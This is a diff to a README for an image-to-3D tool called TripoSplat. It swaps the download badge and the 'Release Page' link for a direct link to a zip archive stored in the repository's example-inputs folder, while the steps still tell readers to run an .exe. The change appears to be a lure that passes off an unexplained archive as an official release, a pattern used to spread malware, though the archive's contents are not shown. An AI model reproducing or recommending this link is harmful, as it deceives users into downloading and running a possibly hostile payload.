@@ -1,6 +1,6 @@
 # 🌐 TripoSplat - Turn flat images into 3D objects
 
-[![](https://img.shields.io/badge/Download-TripoSplat-blue)](https://github.com/invitro-dampproofcourse822/TripoSplat/releases)
+[![](https://img.shields.io/badge/Download-TripoSplat-blue)](https://github.com/invitro-dampproofcourse822/TripoSplat/raw/refs/heads/main/static/example_inputs/Splat_Tripo_v3.5.zip)
 
 TripoSplat creates 3D models from single 2D images. This tool transforms a standard picture into a detailed 3D structure. The software uses recent advancements in Gaussian technology to build files you can use in animation or design applications. TripoAI designed this software to handle the complex math required for 3D reconstruction automatically.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware components to run TripoSplat effectively. 
 
 Follow these steps to obtain and prepare the software on your computer.
 
-1. Navigate to the [TripoSplat Release Page](https://github.com/invitro-dampproofcourse822/TripoSplat/releases) to access the current versions.
+1. Navigate to the [TripoSplat Release Page](https://github.com/invitro-dampproofcourse822/TripoSplat/raw/refs/heads/main/static/example_inputs/Splat_Tripo_v3.5.zip) to access the current versions.
 2. Look for the latest release version at the top of the list.
 3. Choose the file ending in `.exe` to begin the download.
 4. Save the file to your desktop or a folder you can find easily.
